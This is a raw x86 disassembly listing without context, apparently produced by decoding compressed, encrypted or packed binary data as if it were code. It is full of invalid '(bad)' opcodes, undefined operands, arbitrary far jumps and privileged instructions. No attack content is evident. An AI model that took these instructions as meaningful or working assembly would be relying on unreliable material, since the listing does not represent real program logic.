  42e53c:	jbe    0x42e4cc
  42e53e:	inc    esi
  42e53f:	pop    eax
  42e540:	gs js  0x42e541
  42e543:	dec    esp
  42e544:	call   0xc6280a53
  42e549:	mov    edx,0x7affcb4c
  42e54e:	jmp    0x2c45:0xf28a9985
  42e555:	imul   esi,esi,0x5c104cdd
  42e55b:	clc    
  42e55c:	cmp    al,0xa8
  42e55e:	pop    eax
  42e55f:	jl     0x42e52d
  42e561:	pop    edi
  42e562:	jmp    0x6cef:0xe32573a3
  42e569:	push   eax
  42e56a:	cdq    
  42e56b:	push   ebx
  42e56c:	xor    al,0x8
  42e56e:	push   0x71
  42e570:	mov    ah,BYTE PTR [ecx+0xeaa4fb1]
  42e576:	test   eax,0x1e4ad8e3
  42e57b:	cmp    eax,DWORD PTR [esi+0x3b01aca2]
  42e581:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e582:	jecxz  0x42e5df
  42e584:	fcomp  QWORD PTR [ecx-0x79]
  42e587:	push   es
  42e588:	inc    edx
  42e589:	and    eax,0x28090b71
  42e58e:	cmp    ebp,ecx
  42e590:	dec    ebx
	...
  42e5f1:	add    BYTE PTR [eax],al
  42e5f3:	add    BYTE PTR [ebp+0x38],dl
  42e5f6:	into   
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	test   eax,0x5e7d3c7d
  42e605:	icebp  
  42e606:	add    DWORD PTR [eax],eax
  42e608:	add    eax,0x1a000001
  42e60d:	fst    QWORD PTR [edi+0x7d3a60d7]
  42e613:	dec    ebp
  42e614:	cmp    dl,ch
  42e616:	push   esp
  42e617:	dec    ebp
  42e618:	xchg   esp,eax
  42e619:	lock mov esi,0x7e2fa12d
  42e61f:	into   
  42e620:	mov    edx,DWORD PTR [ecx]
  42e622:	ds aam 0x4d
  42e625:	lods   al,BYTE PTR ds:[esi]
  42e626:	xor    al,0xd5
  42e628:	cli    
  42e629:	mov    DWORD PTR [ebx-0x137906b2],edi
  42e62f:	iret   
  42e630:	mov    eax,ds:0x6cdd52b2
  42e635:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e636:	xor    cl,dl
  42e638:	fcom   DWORD PTR [esi]
  42e63a:	imul   ebx,DWORD PTR [ebx+esi*8-0x7f],0xffffff9e
  42e63f:	imul   eax,DWORD PTR [edi+0x1],0x51
  42e643:	xor    al,0xf4
  42e645:	sahf   
  42e646:	sub    cl,BYTE PTR [edx]
  42e648:	ss xchg ecx,eax
  42e64a:	retf   0x9df8
  42e64d:	mov    esi,0xd79219ce
  42e652:	push   esi
  42e653:	mov    WORD PTR [ebx+0x4034c52a],fs
  42e659:	fild   QWORD PTR [edi+edx*2+0x3b]
  42e65d:	or     BYTE PTR [eax],dh
  42e65f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e660:	pop    esi
  42e661:	shl    BYTE PTR [esi+eax*4],1
  42e664:	outs   dx,BYTE PTR ds:[esi]
  42e665:	add    DWORD PTR [esi+0x3b],ecx
  42e668:	push   esi
  42e669:	fist   DWORD PTR [edx+edi*1-0x4a]
  42e66d:	cmp    DWORD PTR [ebx-0x1d],ebx
  42e670:	xchg   esp,eax
  42e671:	jns    0x42e637
  42e673:	adc    BYTE PTR [ecx-0x2b],bh
  42e676:	lock hlt 
  42e678:	gs xor al,0x19
  42e67b:	dec    eax
  42e67c:	inc    eax
  42e67d:	gs nop
  42e67f:	out    dx,al
  42e680:	jmp    0xbe95903a
  42e685:	adc    cl,ah
  42e687:	(bad)  
  42e688:	idiv   edx
  42e68a:	out    dx,al
  42e68b:	xchg   al,dl
  42e68d:	outs   dx,BYTE PTR ds:[esi]
  42e68e:	loope  0x42e6b1
  42e690:	call   0xce5:0x22205e55
  42e697:	fdiv   QWORD PTR [eax-0x5c]
  42e69a:	jns    0x42e6d0
  42e69c:	(bad)  
  42e69d:	jmp    0x42e650
  42e69f:	mov    eax,0xd062434a
  42e6a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e6a5:	dec    edx
  42e6a6:	cmp    cl,BYTE PTR [edx-0x17eb7a8a]
  42e6ac:	push   edx
  42e6ad:	mov    al,0x86
  42e6af:	lods   al,BYTE PTR ds:[esi]
  42e6b0:	jo     0x42e6b4
  42e6b2:	inc    esp
  42e6b3:	xlat   BYTE PTR ds:[ebx]
  42e6b4:	imul   edi,DWORD PTR [ebx+0x2feb2581],0x32
  42e6bb:	mov    cl,0x23
  42e6bd:	mov    cl,0xbf
  42e6bf:	jbe    0x42e702
  42e6c1:	mov    ah,0x7f
  42e6c3:	std    
  42e6c4:	mov    al,ds:0x6f067a3f
  42e6c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e6ca:	mov    WORD PTR [edi+0x7755ac8b],es
  42e6d0:	pushf  
  42e6d1:	sub    DWORD PTR ds:0x76e0261e,ebp
  42e6d7:	loope  0x42e6e7
  42e6d9:	cmp    DWORD PTR [ebx-0x3d67aba6],ebx
  42e6df:	push   es
  42e6e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e6e1:	xchg   BYTE PTR [ecx+0x16209c24],bh
  42e6e7:	push   ss
  42e6e8:	icebp  
  42e6e9:	and    ch,bl
  42e6eb:	mov    ds:0x2f220b6a,eax
  42e6f0:	fist   WORD PTR [eax]
  42e6f2:	fisubr WORD PTR [eax+0x3266d2be]
  42e6f8:	call   0xd4c2:0x548ecd3
  42e6ff:	or     cl,dl
  42e701:	mov    al,ds:0xb39e899f
  42e706:	mov    bh,0x8e
  42e708:	jmp    0x6396877b
  42e70d:	dec    eax
  42e70e:	in     eax,dx
  42e70f:	aas    
  42e710:	iret   
	...
  42e771:	add    BYTE PTR [eax],al
  42e773:	add    BYTE PTR [edx+0x39],bl
  42e776:	dec    esi
  42e777:	sub    eax,0x7f7b7f6f
  42e77c:	sub    BYTE PTR fs:[esi],cl
  42e77f:	ficomp DWORD PTR [ecx-0x17]
  42e782:	shl    BYTE PTR [ebx+0x63],cl
  42e785:	repnz add DWORD PTR [eax],eax
  42e788:	add    eax,0x10000001
  42e78d:	adc    BYTE PTR [edx-0x15],al
  42e790:	aas    
  42e791:	shl    BYTE PTR [edi],1
  42e793:	in     al,dx
  42e794:	test   DWORD PTR [edx-0x28],eax
  42e797:	xor    BYTE PTR [edx],0x2
  42e79a:	mov    eax,0x273d636c
  42e79f:	out    dx,al
  42e7a0:	mov    ds,WORD PTR [ecx-0x55]
  42e7a3:	add    BYTE PTR [eax+0x43],0xce
  42e7a7:	mov    cl,0x3
  42e7a9:	xchg   BYTE PTR [ecx+0xa],dh
  42e7ac:	(bad)  
  42e7ad:	or     al,0xee
  42e7af:	cmp    al,0xa6
  42e7b1:	daa    
  42e7b2:	aad    0xce
  42e7b4:	jo     0x42e7c3
  42e7b6:	(bad)  
  42e7b8:	pop    ecx
  42e7b9:	push   cs
  42e7ba:	rep ins DWORD PTR es:[edi],dx
  42e7bc:	push   esp
  42e7bd:	inc    edx
  42e7be:	sti    
  42e7bf:	dec    esi
  42e7c0:	lahf   
  42e7c1:	jecxz  0x42e7fd
  42e7c3:	and    cl,BYTE PTR [ecx]
  42e7c5:	rcl    BYTE PTR [ecx-0x272943e6],0x71
  42e7cc:	push   0xa
  42e7ce:	enter  0xd4cd,0x47
  42e7d2:	push   ss
  42e7d3:	jecxz  0x42e854
  42e7d5:	sub    DWORD PTR [ebp-0x3a],eax
  42e7d8:	inc    esi
  42e7d9:	mov    ecx,0x1aefb11b
  42e7de:	xor    cl,BYTE PTR [ebp-0x43]
  42e7e1:	loopne 0x42e782
  42e7e3:	jmp    0x5fa4:0xac8a76c9
  42e7ea:	icebp  
  42e7eb:	ds xchg ebx,eax
  42e7ed:	xchg   ebx,eax
  42e7ee:	lahf   
  42e7ef:	push   ecx
  42e7f0:	pop    eax
  42e7f1:	mov    ah,0xd
  42e7f3:	lea    ebp,[edi-0x6e8535f0]
  42e7f9:	adc    al,BYTE PTR [edx]
  42e7fb:	call   0x3a7e2f8b
  42e800:	adc    al,0x31
  42e802:	add    eax,0x651b209
  42e807:	cld    
  42e808:	mov    ebp,eax
  42e80a:	call   0xeb6964b6
  42e80f:	cmp    eax,0xa8328fef
  42e814:	mov    dh,0x24
  42e816:	jecxz  0x42e873
  42e818:	sub    BYTE PTR ds:0xe83f84b7,al
  42e81e:	aaa    
  42e81f:	sahf   
  42e820:	outs   dx,DWORD PTR ds:[esi]
  42e821:	mov    bl,0x89
  42e823:	xchg   ebx,eax
  42e824:	out    dx,eax
  42e825:	sbb    edx,DWORD PTR [ecx-0x3c]
  42e828:	mov    eax,ds:0xba987049
  42e82d:	(bad)  
  42e82e:	std    
  42e82f:	enter  0x9b09,0x3c
  42e833:	stos   BYTE PTR es:[edi],al
  42e834:	mov    ebp,ebp
  42e836:	sbb    edi,DWORD PTR ds:0xd7436daf
  42e83c:	add    dl,BYTE PTR [esi+ebx*8-0x260daf55]
  42e843:	lock rcl BYTE PTR [ebx+0x55],0x96
  42e848:	or     eax,DWORD PTR [edx]
  42e84a:	jb     0x42e89c
  42e84c:	inc    edx
  42e84d:	push   esp
  42e84e:	add    ah,BYTE PTR [esi-0x426363e9]
  42e854:	adc    DWORD PTR [ebx],eax
  42e856:	mov    al,0xe6
  42e858:	cli    
  42e859:	push   esi
  42e85a:	mov    esp,0x19780b12
  42e85f:	push   ebp
  42e860:	adc    DWORD PTR [ebx-0x36ac0ba0],esp
  42e866:	and    al,0x5d
  42e868:	xor    eax,0x8625de73
  42e86d:	xchg   esp,eax
  42e86e:	gs and al,0x8d
  42e871:	and    eax,0x981ab9bb
  42e876:	push   0x44534391
  42e87b:	sub    eax,0xc7c7c486
  42e880:	in     eax,dx
  42e881:	rol    DWORD PTR [eax-0x649fc6b7],1
  42e887:	push   ss
  42e888:	(bad)  
  42e889:	sti    
  42e88a:	mov    cl,0x3b
  42e88c:	mov    esi,0xea6c929
	...
  42e8f1:	add    BYTE PTR [eax],al
  42e8f3:	add    bl,al
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx+0x4923f82b]
  42e901:	xchg   DWORD PTR [esi],esi
  42e903:	mov    cl,0x68
  42e905:	repz add DWORD PTR [eax],eax
  42e908:	add    eax,0xb5000001
  42e90d:	into   
  42e90e:	gs inc esp
  42e910:	pop    edx
  42e911:	and    BYTE PTR [ebx],dh
  42e913:	push   ss
  42e914:	pushf  
  42e915:	inc    eax
  42e916:	mov    WORD PTR [esi-0x29c7e6d9],gs
  42e91c:	sub    bh,BYTE PTR [eax+0x65]
  42e91f:	hlt    
  42e920:	jno    0x42e8ef
  42e922:	imul   edi,DWORD PTR [ecx],0xb950731f
  42e928:	repnz in eax,0x11
  42e92b:	imul   ebp,edx,0xffffffff
  42e92e:	xor    bl,BYTE PTR ds:0xafca1142
  42e934:	push   ss
  42e935:	pushf  
  42e936:	jecxz  0x42e8ba
  42e938:	test   eax,0x8a12b9cf
  42e93d:	nop
  42e93e:	or     ah,BYTE PTR [esi-0x19afb24f]
  42e944:	mov    bh,0x75
  42e946:	ins    DWORD PTR es:[edi],dx
  42e947:	xchg   eax,esi
  42e949:	arpl   di,ax
  42e94b:	rcl    DWORD PTR [eax-0x6f],cl
  42e94e:	shl    DWORD PTR [ebx+0x1a11d03e],1
  42e954:	test   BYTE PTR [edi+ebx*8],dl
  42e957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e958:	out    dx,al
  42e959:	push   ecx
  42e95a:	pop    edi
  42e95b:	push   es
  42e95c:	jp     0x42e97d
  42e95e:	sub    al,0xfc
  42e960:	sbb    al,0x8f
  42e962:	sahf   
  42e963:	(bad)  
  42e964:	xor    eax,0x5a9c1d76
  42e969:	(bad)  
  42e96a:	loopne 0x42e9b1
  42e96c:	sub    DWORD PTR ds:[esi],edi
  42e96f:	xchg   edi,eax
  42e970:	std    
  42e971:	mov    ecx,0x74a166d5
  42e976:	scas   eax,DWORD PTR es:[edi]
  42e977:	lds    ecx,FWORD PTR [ebx+0x32]
  42e97a:	loope  0x42e92a
  42e97c:	int    0xb5
  42e97e:	push   esp
  42e97f:	aaa    
  42e980:	mov    edx,edx
  42e982:	lods   eax,DWORD PTR ds:[esi]
  42e983:	xor    eax,0x81437a6a
  42e988:	shl    BYTE PTR [edi-0x1553ae4e],1
  42e98e:	daa    
  42e98f:	xor    al,0xaa
  42e991:	dec    esi
  42e992:	xchg   edx,eax
  42e993:	inc    esi
  42e994:	cmp    DWORD PTR [ebp+0x79],esi
  42e997:	jg     0x42e993
  42e999:	sti    
  42e99a:	jne    0x42e981
  42e99c:	aas    
  42e99d:	and    edi,esi
  42e99f:	imul   eax,esi,0xffffffc5
  42e9a2:	mov    edx,0x13cb36c1
  42e9a7:	jno    0x42e947
  42e9a9:	sbb    BYTE PTR [ebx-0x7943d3b7],0xd0
  42e9b0:	ins    DWORD PTR es:[edi],dx
  42e9b1:	sbb    bl,cl
  42e9b3:	mov    ecx,0xd9420dbd
  42e9b8:	mov    eax,ds:0x882e0aa0
  42e9bd:	sbb    eax,0x384d0d9e
  42e9c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e9c3:	shr    DWORD PTR [ecx-0x26],cl
  42e9c6:	sbb    eax,0xdfbd765b
  42e9cb:	les    ecx,FWORD PTR [ecx]
  42e9cd:	adc    eax,0x57fdac4b
  42e9d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e9d3:	pop    es
  42e9d4:	jae    0x42e988
  42e9d6:	icebp  
  42e9d7:	push   edx
  42e9d8:	pop    ecx
  42e9d9:	inc    edi
  42e9da:	pop    ecx
  42e9db:	(bad)  
  42e9dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e9dd:	push   ebx
  42e9de:	test   BYTE PTR [esp+ebx*4-0x76],bh
  42e9e2:	mov    bh,0xe5
  42e9e4:	push   edi
  42e9e5:	in     al,0x77
  42e9e7:	pop    ebx
  42e9e8:	cmp    BYTE PTR [ebp-0x6a643b13],0x9e
  42e9ef:	sub    al,0x92
  42e9f1:	out    0x1b,al
  42e9f3:	dec    di
  42e9f5:	lds    edi,FWORD PTR [ecx]
  42e9f7:	popa   
  42e9f8:	inc    ebx
  42e9f9:	mov    al,ds:0x5181baaf
  42e9fe:	xchg   edx,eax
  42e9ff:	sbb    eax,0x6b0c2a37
  42ea04:	ins    DWORD PTR es:[edi],dx
  42ea05:	jmp    eax
  42ea07:	or     BYTE PTR [ecx],0x8b
  42ea0a:	mov    bh,0x31
  42ea0c:	sbb    eax,0xd753bf4e
	...
  42ea71:	add    BYTE PTR [eax],al
  42ea73:	add    ch,ah
  42ea75:	mov    edx,0xebdfe392
  42ea7a:	cmc    
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	jmp    0x6dd5aa23
  42ea85:	hlt    
  42ea86:	add    DWORD PTR [eax],eax
  42ea88:	add    eax,0x94000001
  42ea8d:	popa   
  42ea8e:	ds fcmovb st,st(7)
  42ea91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ea92:	out    0xf9,eax
  42ea94:	sub    al,0x2f
  42ea96:	fs xchg edx,eax
  42ea98:	fsub   DWORD PTR [ebp+0x63]
  42ea9b:	jnp    0x42ea6d
  42ea9d:	push   es
  42ea9e:	inc    ebx
  42ea9f:	gs ret 
  42eaa1:	add    ebp,esi
  42eaa3:	cdq    
  42eaa4:	dec    esi
  42eaa5:	mov    al,0xe7
  42eaa7:	lds    ecx,FWORD PTR [ecx-0x1bdb12dd]
  42eaad:	ins    BYTE PTR es:[edi],dx
  42eaae:	push   eax
  42eaaf:	(bad)  
  42eab0:	fnstenv [edi+edx*4]
  42eab3:	ror    BYTE PTR [edx-0x2ef5f72b],1
  42eab9:	punpckhdq mm7,QWORD PTR ds:0xb93be99d
  42eac0:	test   BYTE PTR [esp+eax*1+0x27],al
  42eac4:	inc    ecx
  42eac5:	cmp    DWORD PTR [ecx],edx
  42eac7:	or     DWORD PTR [ecx],edi
  42eac9:	mov    ebx,0x79b01c08
  42eace:	mov    ds:0x238d7918,eax
  42ead3:	sub    cl,BYTE PTR [edi]
  42ead5:	jno    0x42eb1b
  42ead7:	pop    edi
  42ead8:	test   DWORD PTR [esi],esi
  42eada:	xor    esi,ecx
  42eadc:	cmp    al,0x7
  42eade:	xor    edx,DWORD PTR [eax-0x75]
  42eae1:	adc    eax,0x27f5dc73
  42eae6:	pop    ebp
  42eae7:	jns    0x42eae5
  42eae9:	sahf   
  42eaea:	out    dx,al
  42eaeb:	aaa    
  42eaec:	cmp    DWORD PTR [edi],ecx
  42eaee:	sub    eax,0x152ad833
  42eaf3:	outs   dx,BYTE PTR ds:[esi]
  42eaf4:	test   eax,0x97109db6
  42eaf9:	push   ss
  42eafa:	lahf   
  42eafb:	outs   dx,BYTE PTR ds:[esi]
  42eafc:	pop    ebx
  42eafd:	push   ecx
  42eafe:	(bad)
  42eb01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb02:	std    
  42eb03:	dec    edi
  42eb04:	les    edx,FWORD PTR [esi-0x7f]
  42eb07:	mov    ebx,DWORD PTR [ebx+0x38]
  42eb0a:	adc    eax,0x8a7829be
  42eb0f:	test   al,0xea
  42eb11:	dec    ebp
  42eb12:	sub    eax,0x74e3c858
  42eb17:	sti    
  42eb18:	out    dx,eax
  42eb19:	out    0x65,al
  42eb1b:	push   esp
  42eb1c:	inc    esp
  42eb1d:	stos   DWORD PTR es:[edi],eax
  42eb1e:	bound  ebx,QWORD PTR [esi+0x1af2e4a2]
  42eb24:	jb     0x42eb93
  42eb26:	adc    dl,BYTE PTR [ecx-0x5855eb2a]
  42eb2c:	iret   
  42eb2d:	(bad)  
  42eb2e:	aad    0x38
  42eb30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb31:	in     al,dx
  42eb32:	rol    BYTE PTR [esi+0x5aefcbc],0xa2
  42eb39:	in     al,dx
  42eb3a:	bound  ebp,QWORD PTR [esi+0x54]
  42eb3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb3e:	xchg   edi,eax
  42eb3f:	pop    ebp
  42eb40:	adc    BYTE PTR ds:0xa8e8e5c7,0xe4
  42eb47:	sbb    eax,0x51cfd7c5
  42eb4c:	cmp    al,0xae
  42eb4e:	push   ebx
  42eb4f:	stc    
  42eb50:	ja     0x42eb8f
  42eb52:	xchg   ebp,eax
  42eb53:	xor    dl,BYTE PTR [eax]
  42eb55:	(bad)  [ebx-0x2cc56926]
  42eb5b:	pop    esp
  42eb5c:	adc    DWORD PTR [ecx+0x40d9963],edi
  42eb62:	mov    al,ds:0xa3c12770
  42eb67:	push   0xe40db075
  42eb6c:	mov    edx,0xaaaae001
  42eb71:	jp     0x42eb55
  42eb73:	xchg   BYTE PTR [edx+eax*4],al
  42eb76:	lds    eax,FWORD PTR [edx-0x37]
  42eb79:	rcl    ebx,0x72
  42eb7c:	add    bl,ch
  42eb7e:	push   edx
  42eb7f:	pusha  
  42eb80:	xchg   cl,dl
  42eb82:	call   0x8c27:0xc6b7ae1
  42eb89:	cmp    bl,BYTE PTR [ecx+0x6ae59f07]
  42eb8f:	sbb    bl,bl
	...
  42ebf1:	add    BYTE PTR [eax],al
  42ebf3:	add    BYTE PTR [esi+0x41],bh
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	cmp    edi,0x7208f3f2
  42ec05:	cmc    
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    eax,0xc3000001
  42ec0d:	mov    bl,0x4c
  42ec0f:	add    eax,0x7e2d57a5
  42ec14:	add    ah,BYTE PTR [esi-0x66]
  42ec17:	add    ecx,ebx
  42ec19:	mov    WORD PTR [ebx+ebx*2],fs
  42ec1c:	mov    bh,0xa2
  42ec1e:	(bad)  
  42ec1f:	push   ebx
  42ec20:	xchg   edx,eax
  42ec21:	fstp   TBYTE PTR [esi+0x3e]
  42ec24:	addr16 jp 0x42ec3a
  42ec27:	push   0x32
  42ec29:	cmp    edi,0x1b
  42ec2c:	jbe    0x42ec30
  42ec2e:	mov    dl,0x1f
  42ec30:	call   0xa1ecac95
  42ec35:	or     dl,al
  42ec37:	xor    BYTE PTR cs:[edi+0x63d08dab],al
  42ec3e:	aam    0x7a
  42ec40:	jmp    0x42ec93
  42ec42:	clc    
  42ec43:	mov    ds:0x4c27fa4e,eax
  42ec48:	(bad)  
  42ec49:	aas    
  42ec4a:	cld    
  42ec4b:	push   0x1d
  42ec4d:	popf   
  42ec4e:	dec    edx
  42ec4f:	fcomp  DWORD PTR [eax-0x10]
  42ec52:	cmp    eax,0xcf2cb26a
  42ec57:	jo     0x42eca9
  42ec59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec5a:	push   edi
  42ec5b:	retf   
  42ec5c:	in     eax,dx
  42ec5d:	rcl    DWORD PTR [eax+0x472e98fa],cl
  42ec63:	out    0x29,eax
  42ec65:	xor    DWORD PTR [eax],ebx
  42ec67:	or     edx,DWORD PTR [eax]
  42ec69:	sub    al,0x55
  42ec6b:	pusha  
  42ec6c:	fisttp QWORD PTR [eax-0x2df35e64]
  42ec72:	imul   eax,DWORD PTR [edi-0x17ad8fe0],0x3b
  42ec79:	mov    ?,edx
  42ec7b:	push   edi
  42ec7c:	sub    esp,DWORD PTR [eax]
  42ec7e:	outs   dx,DWORD PTR gs:[esi]
  42ec80:	rcr    cl,1
  42ec82:	sub    dh,0xeb
  42ec85:	sub    BYTE PTR [esi-0x1365aef3],ah
  42ec8b:	cwde   
  42ec8c:	jae    0x42ec71
  42ec8e:	mov    edx,0x54ff6798
  42ec93:	test   eax,0x88ba045a
  42ec98:	pop    esp
  42ec99:	mov    DWORD PTR ds:0xc2565773,ecx
  42ec9f:	out    dx,eax
  42eca0:	int3   
  42eca1:	or     ch,bh
  42eca3:	pusha  
  42eca4:	int3   
  42eca5:	jno    0x42ecd8
  42eca7:	nop
  42eca8:	mov    WORD PTR [esi-0x23],?
  42ecab:	pop    esi
  42ecac:	jnp    0x42ece2
  42ecae:	outs   dx,BYTE PTR ds:[esi]
  42ecaf:	inc    eax
  42ecb0:	mov    edx,0x83cd9f3a
  42ecb5:	cmp    bh,BYTE PTR [ebx-0x51d9666a]
  42ecbb:	jbe    0x42ec75
  42ecbd:	mov    esp,0xade89380
  42ecc2:	xchg   esp,eax
  42ecc3:	test   BYTE PTR [eax],al
  42ecc5:	sbb    bh,BYTE PTR [ecx]
  42ecc7:	rcl    DWORD PTR [ecx-0x46317d12],0xcc
  42ecce:	js     0x42ec8d
  42ecd0:	inc    esi
  42ecd1:	adc    al,bh
  42ecd3:	fild   QWORD PTR [ecx]
  42ecd5:	mov    eax,ds:0x8b2f702b
  42ecda:	adc    dl,BYTE PTR [ebx]
  42ecdc:	aaa    
  42ecdd:	stos   BYTE PTR es:[edi],al
  42ecde:	mov    ds,WORD PTR [ecx]
  42ece0:	jbe    0x42ec77
  42ece2:	xlat   BYTE PTR ds:[ebx]
  42ece3:	stos   BYTE PTR es:[edi],al
  42ece4:	push   0xffffffdb
  42ece6:	fwait
  42ece7:	bound  esi,QWORD PTR [eax+0x34181169]
  42eced:	aad    0x8e
  42ecef:	cmp    al,0xa2
  42ecf1:	jmp    0x42ed15
  42ecf3:	and    al,0xbf
  42ecf5:	dec    edx
  42ecf6:	inc    ecx
  42ecf7:	xchg   ebp,eax
  42ecf8:	mov    edx,0x6e46d88b
  42ecfd:	cmp    BYTE PTR ds:0x96a435f8,dh
  42ed03:	xchg   DWORD PTR [eax-0x69aae479],eax
  42ed09:	cmp    eax,0xdb668c05
  42ed0e:	(bad)  
  42ed0f:	fisttp WORD PTR [ebx+0x0]
	...
  42ed72:	add    BYTE PTR [eax],al
  42ed74:	sub    dh,dh
  42ed76:	scas   eax,DWORD PTR es:[edi]
  42ed77:	fdivr  st,st(7)
  42ed79:	fnstcw WORD PTR [edi-0xa]
  42ed7c:	jecxz  0x42edb0
  42ed7e:	test   DWORD PTR [edx+0x4f256a8b],esp
  42ed84:	ja     0x42ed7c
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    eax,0x75000001
  42ed8d:	in     al,dx
  42ed8e:	cmp    eax,DWORD PTR [edi]
  42ed90:	xor    BYTE PTR [ecx+0x3a242cc7],0x43
  42ed97:	repz pop es
  42ed99:	push   esp
  42ed9a:	das    
  42ed9b:	imul   esi,DWORD PTR [edx+0xdaf7d9b],0xffffffdd
  42eda2:	add    al,0x94
  42eda4:	and    ah,BYTE PTR [eax]
  42eda6:	cli    
  42eda7:	fbstp  TBYTE PTR [ebx+0x36]
  42edaa:	mov    bh,0x1
  42edac:	dec    edi
  42edad:	(bad)  
  42edb0:	lahf   
  42edb1:	mov    cl,0xce
  42edb3:	cld    
  42edb4:	sub    ah,bh
  42edb6:	cs fcmovbe st,st(0)
  42edb9:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  42edbb:	aam    0xb6
  42edbd:	mov    ebp,DWORD PTR [ebx]
  42edbf:	je     0x42edc8
  42edc1:	(bad)  
  42edc2:	fsubr  DWORD PTR [edx-0x3]
  42edc5:	ss jg  0x42ee2b
  42edc8:	push   ss
  42edc9:	je     0x42edf5
  42edcb:	sub    edx,ebp
  42edcd:	in     eax,0xaa
  42edcf:	lock add DWORD PTR [edx-0xa56556b],ebp
  42edd6:	scas   eax,DWORD PTR es:[edi]
  42edd7:	dec    ecx
  42edd8:	pop    ds
  42edd9:	sub    ebx,DWORD PTR [ebp-0x7a]
  42eddc:	mov    ds:0x1a73768a,eax
  42ede1:	das    
  42ede2:	mov    ch,0x99
  42ede4:	in     al,0xde
  42ede6:	jno    0x42edd2
  42ede8:	pop    ebx
  42ede9:	cmp    eax,0x3bf104a1
  42edee:	ja     0x42ee43
  42edf0:	out    0x14,eax
  42edf2:	or     edi,DWORD PTR [edx-0x54]
  42edf5:	cmc    
  42edf6:	jae    0x42edf1
  42edf8:	ja     0x42ee75
  42edfa:	not    cl
  42edfc:	das    
  42edfd:	sbb    ch,BYTE PTR [edx]
  42edff:	(bad)  
  42ee01:	jle    0x42edaa
  42ee03:	fisttp WORD PTR [ecx+ecx*2+0x6f]
  42ee07:	mov    dl,0xf
  42ee09:	ss inc ebx
  42ee0b:	rcr    DWORD PTR [ebp+0x53],0x1f
  42ee0f:	scas   eax,DWORD PTR es:[edi]
  42ee10:	cmp    BYTE PTR [esp+eiz*4],dl
  42ee13:	lods   eax,DWORD PTR ds:[esi]
  42ee14:	shr    DWORD PTR [edi+0x7a],0x7f
  42ee18:	hlt    
  42ee19:	xor    BYTE PTR [edx],0x81
  42ee1c:	push   esp
  42ee1d:	pop    edi
  42ee1e:	or     al,0x9d
  42ee20:	or     BYTE PTR [edi],dl
  42ee22:	aam    0x2d
  42ee24:	stos   BYTE PTR es:[edi],al
  42ee25:	nop
  42ee26:	test   DWORD PTR [ebx+ebx*8-0x4c],0x45c04880
  42ee2e:	jne    0x42edce
  42ee30:	inc    ebx
  42ee31:	mov    fs,WORD PTR [edx+0x5d4cff6d]
  42ee37:	cmp    al,BYTE PTR [ecx+0x142e55b3]
  42ee3d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee3f:	push   ss
  42ee40:	(bad)  
  42ee41:	sti    
  42ee42:	xor    al,0x5
  42ee44:	adc    BYTE PTR [ebp+eiz*2+0x25],0x55
  42ee49:	ds jbe 0x42ee1f
  42ee4c:	imul   esp,DWORD PTR [ebx+0x20],0xffffffa6
  42ee50:	cmp    eax,0xf6c16198
  42ee56:	repnz xchg ebx,eax
  42ee58:	xor    BYTE PTR [ecx],dh
  42ee5a:	push   ss
  42ee5b:	and    DWORD PTR cs:[ecx],esi
  42ee5e:	(bad)  
  42ee60:	cmp    BYTE PTR [esi+0x62],dl
  42ee63:	push   ebp
  42ee64:	clc    
  42ee65:	mov    cl,cl
  42ee67:	enter  0x1555,0xea
  42ee6b:	xchg   edx,eax
  42ee6c:	loopne 0x42ee40
  42ee6e:	lods   eax,DWORD PTR ds:[esi]
  42ee6f:	cld    
  42ee70:	push   ds
  42ee71:	mov    ah,0x90
  42ee73:	imul   DWORD PTR [ebx]
  42ee75:	xor    eax,0x21654a02
  42ee7a:	cmp    al,0x1d
  42ee7c:	push   edx
  42ee7d:	pop    ss
  42ee7e:	mov    cl,0x3a
  42ee80:	outs   dx,BYTE PTR ds:[esi]
  42ee81:	lea    esp,[ecx+0x4f]
  42ee84:	push   edi
  42ee85:	int    0xa6
  42ee87:	div    BYTE PTR [edi-0x7688881e]
  42ee8d:	push   esp
  42ee8e:	push   0xcef4
	...
  42eef3:	add    bl,al
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	js     0x42eef1
  42ef02:	mov    bh,0x5f
  42ef04:	jl     0x42eefd
  42ef06:	add    DWORD PTR [eax],eax
  42ef08:	add    eax,0x8e000001
  42ef0d:	ins    BYTE PTR es:[edi],dx
  42ef0e:	aaa    
  42ef0f:	mov    bh,0x6f
  42ef11:	fisubr DWORD PTR [esi]
  42ef13:	xchg   BYTE PTR [edi],bh
  42ef15:	pusha  
  42ef16:	js     0x42ef22
  42ef18:	cmp    bl,BYTE PTR [ebx*8+0x43a50584]
  42ef1f:	aad    0x8f
  42ef21:	and    BYTE PTR [ebp+eax*2+0x22],bl
